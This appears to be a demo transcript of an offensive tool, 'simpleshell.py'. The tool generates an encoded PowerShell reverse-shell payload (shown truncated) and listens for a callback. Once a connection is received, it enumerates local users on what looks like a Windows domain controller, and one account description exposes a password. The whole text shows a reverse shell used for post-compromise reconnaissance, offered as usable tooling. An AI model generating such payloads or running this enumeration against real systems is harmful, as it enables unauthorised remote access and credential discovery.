> $ python simpleshell.py  

> $> .payload

> [+] Encoded shell created  
powershell -e JABjAGwAaQBlAG4AdAAgA...

> $>.listen  
> > [+] Connection received

> $> get-localuser  
> Name          Enabled Description                                             
> ----          ------- -----------                                             
> Administrator True    Built-in account for administering the computer/domain  
> Guest         False   Built-in account for guest access to the computer/domain
> krbtgt        False   Key Distribution Center Service Account                 
> john          True                                                            
> anne          True                                                            
> test          True                                                            
> testuser2     True    password: test                                          
> DC$           True  